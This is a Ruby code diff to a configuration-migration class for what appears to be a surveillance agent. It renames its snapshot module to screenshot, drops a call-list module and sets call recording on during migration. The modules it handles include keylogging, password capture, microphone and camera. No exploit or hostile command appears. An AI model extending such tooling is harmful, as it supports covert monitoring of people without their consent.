@@ -283,12 +283,16 @@ class ConfigMigration
         a[:module] = (item.keys.delete_if {|x| x == 'enabled'}).first
         a[:enabled] = item['enabled'] == 'false' ? false : true
         case a[:module]
-          when 'application', 'chat', 'clipboard', 'device', 'keylog', 'password', 'calllist', 'url'
+          when 'application', 'chat', 'clipboard', 'device', 'keylog', 'password', 'url'
             # no parameters
+          when 'calllist'
+            # don't migrate the callist agent since it will be merged with the call agent
+            next
           when 'call'
             a.merge! item[a[:module]].first
             a['buffer'] = a['buffer'].to_i * 1024
             a['compression'] = a['compression'].to_i
+            a['record'] = true
           when 'camera'
             a.merge! item[a[:module]].first
             a['quality'] = 'med'
@@ -308,6 +312,7 @@ class ConfigMigration
             a['onlywindow'] = a['onlywindow'] == 'true' ? true : false
             a['quality'] = 'med'
             a[:_ena] = a[:enabled]
+            a[:module] = 'screenshot'
           when 'mic'
             a.merge! item[a[:module]].first
             a['autosense'] = a['autosense'] == 'true' ? true : false
@@ -390,7 +395,7 @@ class ConfigMigration
       subactions = []
 
       modules.each do |m|
-        if m[:enabled] and not ['snapshot', 'camera', 'position'].include? m[:module]
+        if m[:enabled] and not ['screenshot', 'camera', 'position'].include? m[:module]
           subactions << {:action => 'module', :status => 'start', :module => m[:module]}
         end
         m.delete(:enabled)
@@ -424,7 +429,7 @@ class ConfigMigration
           end
           events << event
           m.delete('interval')
-          if m[:module] == 'snapshot'
+          if m[:module] == 'screenshot'
             if m['newwindow'] == 'true'
               event = {:event => 'window', :desc => "new win #{m[:module]}", :enabled => true, :start => actions.size - 1}
               events << event
@@ -439,10 +444,10 @@ class ConfigMigration
       actions.each do |a|
         # skip actions created during migration
         next if a[:_mig]
-        # search for start action for camera, snapshot and position
+        # search for start action for camera, scrennshot and position
         # and transform the start/stop action into an enable/disable event
         a[:subactions].each do |s|
-          if s[:action] == 'module' and ['camera','snapshot', 'position'].include? s[:module]
+          if s[:action] == 'module' and ['camera','screenshot', 'position'].include? s[:module]
             s[:action] = 'event'
             s[:event] = events.index {|e| e[:desc] == "#{s[:module]} loop" and e[:_mig] }
             s[:status] = s[:status] == 'start' ? 'enabled' : 'disabled'
